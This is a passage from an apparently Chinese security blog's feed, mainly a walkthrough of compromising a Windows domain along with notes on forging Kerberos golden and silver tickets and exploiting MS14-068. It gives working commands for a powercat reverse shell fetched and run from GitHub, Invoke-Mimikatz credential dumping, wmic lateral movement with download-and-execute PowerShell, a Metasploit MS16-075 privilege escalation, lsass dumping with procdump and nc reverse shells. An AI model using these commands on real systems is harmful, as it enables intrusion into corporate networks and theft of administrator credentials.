/tmp/golden.ticket</code></pre><p>将票据导入内存中</p><pre><code>kerberos_ticket_use /tmp/golden.ticket</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/17.png" alt="" loading="lazy"></p><p>dir访问目录成功</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/18.png" alt="" loading="lazy"></p><p>金票的创建，需要krbtgt的密码ntml hash，对于防御，只要定期的修改krbtgt的密码，就能使金票失效。</p><h4 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a><strong>白银票据</strong></h4><p>白银票据是TGS颁发给Client的ST票据，根据kerberos协议第5步，Server会对Clinet的ST票据利用Client的hash解密，所以这个过程不需要经过KDC，而且只能访问Server的服务一次。</p><p>满足一下条件，即可以伪造银票：</p><p>1.域的名称</p><p>2.域的SID值</p><p>3.域服务的NTML Hash</p><p>4.要伪造的用户名</p><p>5.目标服务器的kerberos服务</p><p>常用的服务名有</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/19.png" alt="" loading="lazy"></p><p>伪造银票</p><pre><code>kerberos::golden /domain:fanxing.com /sid:S-1-5-21-3408186607-3793295459-3581146574 /target:WIN-M34UCFJIPNQ.fanxing.com /service:cifs /rc4:dcd87fc42d9d8ac03dec5931a55ddd59 /user:fanxing /ptt</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/20.png" alt="" loading="lazy"></p><p>对于银票的防御措施可以开启PAC，PAC只能KDC制作和查看，在注册表中添加一个ValidateKdcPacSignature为1</p><pre><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/21.png" alt="" loading="lazy"></p><h4 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a><strong>MS14-068</strong></h4><p>Client向AS申请一张不包含PAC的TGT票据，会伪造一个PAC，在TGS_REP中，对伪造的PAC验证成功后，会返回一个新的TGT票据。</p><p>通过<a href="https://github.com/abatchy17/Window**ploits/tree/master/MS14-068" target="_blank" rel="noopener">MS14-068exp</a>利用</p><pre><code>MS14-068.exe -u 当前域用户@域名称 -p 当前域用户密码 -s sid值 -d 域控ip</code></pre><p>sid值通过whoami /all获取</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/22.png" alt="" loading="lazy"></p><p>然后会在目录下生成一个证书，利用mimikatz</p><pre><code>kerberos::ptc C:\wwwroot\TGT_xxxxx@fanxing.com.ccache</code></pre><p>就可以使用dir访问到域控的目录</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/23.png" alt="" loading="lazy"></p><p>对于ms14-068的防御可以打补丁KB3011780和使用winserver2012</p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p>1.<a href="https://www.anquanke.com/member/143805" target="_blank" rel="noopener">https://www.anquanke.com/member/143805</a></p><p>2.<a href="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/" target="_blank" rel="noopener">https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;NTML协议&quot;&gt;&lt;a href=&quot;#NTML协议&quot; class=&quot;headerlink&quot; title=&quot;NTML协议&quot;&gt;&lt;/a&gt;&lt;strong&gt;NTML协议&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;在工作组中，密码hash保存在本地的SAM文件中(%SystemRoot%
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>我的一次内网域渗透实战</title>
    <link href="http://yoursite.com/2019/08/14/%E6%88%91%E7%9A%84%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"/>
    <id>http://yoursite.com/2019/08/14/%E6%88%91%E7%9A%84%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/</id>
    <published>2019-08-14T09:34:05.000Z</published>
    <updated>2020-04-29T07:16:59.297Z</updated>
    
    <content type="html"><![CDATA[<h4 id="CobaltStrike反弹shell"><a href="#CobaltStrike反弹shell" class="headerlink" title="CobaltStrike反弹shell"></a><strong>CobaltStrike反弹shell</strong></h4><p>通过CNVD-C-2019-48814获取到shell，由于这个网站存在ETES杀毒软件，写入jsp木马或者利用vbs，certutil，powershell下载msf木马均会被杀，这里可以利用powershell反弹shell的形式在自己的vps上获取到一个shell。具体这个漏洞怎么利用我不说了，网上很多复现文章。<br>在cobaltstrike生成一段powershell代码，插入payload</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/1.png" alt="" loading="lazy"></p><p>执行payload就会在cs上获取到一个会话</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/2.png" alt="" loading="lazy"></p><p>将cobaltstrike上的会话移到metasploit上(怎么移植，网上有很多教程)<br>在metasploit上接收到shell</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/3.png" alt="" loading="lazy"></p><h4 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a><strong>内网信息收集</strong></h4><p>查询域名称：net view /domain<br>查询域内计算机：net view /doamin:xx<br>查询域控制器时间：net time /domain<br>查询域管理用户：net group “domain admins” /domain<br>得到域控制主机名：net group “domain controllers” /domain<br>…..<br>获取域控主机名：net group “domain controllers” /domain</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/4.png" alt="" loading="lazy"></p><p>通过ping主机名获取域控ip地址</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/5.png" alt="" loading="lazy"></p><p>补丁情况：systeminfo</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/6.png" alt="" loading="lazy"></p><p>MS14-068打了补丁，无奈只能上mimikatz读取密码，但是有eset杀毒软件，一上传就被杀了，有没有免杀的mimikatz，幸好powershell没被拦截，通过Invoke-Mimikatz读取密码。</p><p>本地nc监听本地35602端口：</p><pre class=" language-shell"><code class="language-shell">nc -lvvp 35602</code></pre><p>在burpsuite上执行powercat反弹shell</p><pre class=" language-powershell"><code class="language-powershell">powershell <span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>powercat <span class="token operator">-</span>c ip地址 <span class="token operator">-</span>p 端口 <span class="token operator">-</span>e cmd</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/7.png" alt="" loading="lazy"></p><p>Invoke-Mimikatz读取密码</p><pre class=" language-powershell"><code class="language-powershell">powershell <span class="token string">"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"</span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/8.png" alt="" loading="lazy"></p><p>成功读取到域控的管理员账号密码</p><h4 id="拿下其他主机"><a href="#拿下其他主机" class="headerlink" title="拿下其他主机"></a><strong>拿下其他主机</strong></h4><p>有了域控账号密码，ip地址，就可以连接域控了，这里有很多种方法(ipc，wmic，p**ec，sc等等，这里我详细介绍3种方法)</p><h5 id="1-IPC连接"><a href="#1-IPC连接" class="headerlink" title="1.IPC连接"></a>1.IPC连接</h5><p>net use \ip地址\ipc$ 密码 /user:域控主机名\域控管理名<br>将文件copy到其他服务器上：copy 1.bat \ip地址\c$<br>获取服务器的时间：net time \ip地址<br>设置1.bat执行时间：at \ip地址 获取到的服务器时间 执行文件<br>删除ipc记录：net use \ip\ipc$ /del</p><h5 id="2-wmic"><a href="#2-wmic" class="headerlink" title="2.wmic"></a>2.wmic</h5><pre><code>wmic /node:ip地址 /user:用户名 /password:密码 process call create cmd.exe</code></pre><h5 id="3-psexec"><a href="#3-psexec" class="headerlink" title="3.psexec"></a>3.psexec</h5><pre><code>psexec \\ip地址 -u 用户名 -p 密码 cmd</code></pre><p>这里我通过wmic来连接，由于wmic没有回显</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/9.png" alt="" loading="lazy"></p><p>可以执行powershell反弹到cobaltstrike上，在移植到msf上面</p><pre class=" language-powershell"><code class="language-powershell">wmic <span class="token operator">/</span>node:ip地址 <span class="token operator">/</span>user:用户 <span class="token operator">/</span>password:密码 <span class="token keyword">process</span> call create <span class="token string">"cmd.exe /c powershell.exe -nop -w hidden -c \"</span><span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">new-object</span> net<span class="token punctuation">.</span>webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>downloadstring<span class="token punctuation">(</span><span class="token string">'cs上生成的url'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>\<span class="token string">""</span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/10.png" alt="" loading="lazy"></p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/11.png" alt="" loading="lazy"></p><p>在域控中进行下信息收集，获取域成员机器</p><pre><code>查询所有域控制器：dsquery server查询域内计算机：dsquery computer查询域用户：dsquery user查询域用户所在域组：net user 域账号 /domain查询域组所包含的用户：net group 域组名 /domain</code></pre><p>先获取域内计算机名</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/12.png" alt="" loading="lazy"></p><p>通过PING获取域成员主机的ip地址，然后再用域管理wmic进行连接反弹shell，获取的ip如下(没包括域控和存在web漏洞的ip)</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/13.png" alt="" loading="lazy"></p><p>cobaltstrike上线0.4和0.7的主机</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/14.png" alt="" loading="lazy"></p><p>在对0.11主机进行连接时，ipc出现了错误代码86，指定的网络密码不正确。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/15.png" alt="" loading="lazy"></p><p>应该是域管理限制了这个域用户登录这台主机，要其他域用户可能会登录，由于要system权限才可以利用mimikatz抓取密码，所以这里需要提权。</p><h4 id="域控提权"><a href="#域控提权" class="headerlink" title="域控提权"></a><strong>域控提权</strong></h4><p>systeninfo先查看下那些补丁<br>批量获取未打那些补丁</p><pre class=" language-cmd"><code class="language-cmd">systeminfo>micropoor.txt&(for %i in ( KB3164038 KB3141780 ... ) do @Type micropoor.txt|@find /i "%i"|| @echo %i you can fuck)&del /f /q /a micropoor.txt</code></pre><p>获取到 KB3164038(ms16-075)补丁没有打，metasploit提供了个exp</p><pre class=" language-shell"><code class="language-shell">use exploit/windows/local/ms16_075_reflection_juicyset payload windows/meterpreter/reverse_tcpset session 2set lhost ip地址set lport  端口</code></pre><p>成功提到system权限，可以利用mimikatz读取密码了。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/16.png" alt="" loading="lazy"></p><p>由于域控上存在eset杀软，可以通过procdump+mimikatz读取密码<br>先下载procdump到域控上</p><pre class=" language-cmd"><code class="language-cmd">certutil.exe -urlcache -split -f http://xxx.xxx.xxx.xxx/procdump64.exe</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/17.png" alt="" loading="lazy"></p><p>执行：</p><pre class=" language-cmd"><code class="language-cmd">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/18.png" alt="" loading="lazy"></p><p>将lsass.dmp下载本地利用mimikatz读取出密码明文(两部操作都需要管理员权限)</p><pre class=" language-cmd"><code class="language-cmd"> download C:/Windows/system32/lsass.dmp</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/19.png" alt="" loading="lazy"></p><p>下载到本地之后，mimikatz执行：</p><pre class=" language-cmd"><code class="language-cmd">mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full"  > 1.txt</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/20.png" alt="" loading="lazy"></p><p>读取到5个用户明文，这里我只给一张图吧<br>最后登录0.11那个地址，由于cobaltstrike一直都不上线，我就采用的nc反弹</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/21.png" alt="" loading="lazy"></p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/22.png" alt="" loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;CobaltStrike反弹shell&quot;&gt;&lt;a href=&quot;#CobaltStrike反弹shell&quot; class=&quot;headerlink&quot; title=&quot;CobaltStrike反弹shell&quot;&gt;&lt;/a&gt;&lt;strong&gt;CobaltStrike反弹shell&lt;/
      
    
    </summary>
    
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>对学校的某次渗透测试</title>
    <link href="http://yoursite.com/2019/08/07/%E5%AF%B9%E5%AD%A6%E6%A0%A1%E7%9A%84%E6%9F%90%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <id>http://yoursite.com/2019/08/07/%E5%AF%B9%E5%AD%A6%E6%A0%A1%E7%9A%84%E6%9F%90%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</id>
    <published>2019-08-07T07:44:45.000Z</published>
    <updated>2020-05-14T07:31:02.519Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="a8c6a40e98316f3a60e3d398b89d99c159b967c09c63cbb9d0ce8b60466ed998">dd9f35a0f7a129882748da09be428af5</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      密码：TloveY
    
    </summary>
    
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>实战渗透测试(一)</title>
    <link href="http://yoursite.com/2019/08/06/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)/"/>
    <id>http://yoursite.com/2019/08/06/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)/</id>
    <published>2019-08-05T16:00:00.000Z</published>
    <updated>2020-05-14T10:13:38.659Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="62e12fd3a0c8e8c64c41e16642bf9753550bdce90032d181ee4404049cf149ef"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      密码
    
    </summary>
    
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
</feed>
